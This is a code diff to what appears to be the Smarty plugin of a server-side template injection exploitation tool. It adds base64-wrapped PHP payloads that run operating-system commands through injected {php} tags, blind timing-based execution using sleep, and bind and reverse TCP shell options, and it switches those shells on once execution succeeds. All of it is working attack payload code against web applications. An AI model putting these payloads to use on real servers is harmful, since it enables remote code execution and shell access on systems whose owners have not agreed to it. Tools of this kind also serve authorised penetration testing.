@@ -33,17 +33,29 @@ class Smarty(Plugin):
         },
         'execute' : {
             'call': 'evaluate',
-            'execute': """system("%(code)s");"""
+            'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)));"""
         },
         'blind' : {
             'call': 'evaluate_blind',
-            'bool_true' : """TRUE""",
-            'bool_false' : 'FALSE'
+            'bool_true' : """True""",
+            'bool_false' : """False"""
         },
         'evaluate_blind' : {
-            'call': 'evaluate',
-            'evaluate_blind': """%(code)s and sleep(%(delay)i);"""
-        }
+            'call': 'inject',
+            'evaluate_blind': """{php}$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");{/php}"""
+        },
+        'execute_blind' : {
+            'call': 'inject',
+            'execute_blind': """{php}$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep 2");{/php}"""
+        },
+        'tcp_shell' : {
+            'call' : 'execute_blind',
+            'tcp_shell': languages.bash_tcp_shell
+        },
+        'reverse_tcp_shell' : {
+            'call': 'execute_blind',
+            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
+        },
 
     }
 
@@ -89,8 +101,8 @@ class Smarty(Plugin):
                 expected_rand = str(rand.randint_n(2))
                 if expected_rand == self.execute('echo %s' % expected_rand):
                     self.set('execute', True)
-                    #self.set('tcp_shell', True)
-                    #self.set('reverse_tcp_shell', True)
+                    self.set('tcp_shell', True)
+                    self.set('reverse_tcp_shell', True)
 
     def blind_detected(self):
 
@@ -102,5 +114,5 @@ class Smarty(Plugin):
 
         if self.execute_blind('echo %s' % str(rand.randint_n(2))):
             self.set('execute_blind', True)
-            #self.set('tcp_shell', True)
-            #self.set('reverse_tcp_shell', True)
+            self.set('tcp_shell', True)
+            self.set('reverse_tcp_shell', True)
